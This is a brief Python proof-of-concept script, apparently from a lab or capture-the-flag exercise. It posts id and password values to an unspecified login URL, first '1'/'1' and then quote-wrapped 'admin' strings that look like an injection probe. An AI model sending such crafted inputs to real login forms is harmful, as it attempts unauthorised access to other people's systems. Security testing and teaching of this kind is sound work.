import requests

URL = ""

def poc(payload_id, payload_pw):
    data = {"id": payload_id, "pw": payload_pw}
    res = requests.post(URL, data=data)
    print(f"[*] Trying id={payload_id}, pw={payload_pw}")
    print(res.text)
    

if __name__ == "__main__":
    # Case 1
    poc("1", "1")

    # Case 2
    poc("'admin'", "'admin'")

